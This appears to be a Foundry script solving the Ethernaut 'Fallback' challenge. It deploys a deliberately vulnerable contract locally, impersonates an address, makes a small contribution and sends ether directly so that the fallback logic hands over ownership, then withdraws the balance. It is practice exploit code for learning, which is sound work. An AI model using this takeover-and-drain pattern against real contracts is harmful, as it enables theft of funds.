// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import  "forge-std/Script.sol";
import "../src/Fallback.sol";

contract FallbackScript is Script {
    Fallback fb;
       
    function setUp() public {
        
    }

    function run() public {
        fb = new Fallback();
        address ownerfb = fb.owner();
        
        console.log(ownerfb);
        

        vm.deal(address(0), 100 ether);
        vm.startPrank(address(0));


        fb.contribute{value: 0.00001 ether}();
        address(fb).call{value: 1 ether}("");
        uint256 conrtibutions = fb.getContribution();
        console.log(conrtibutions);

        address newOwnerFb = fb.owner();
        console.log(newOwnerFb);

        fb.withdraw();


    }
}
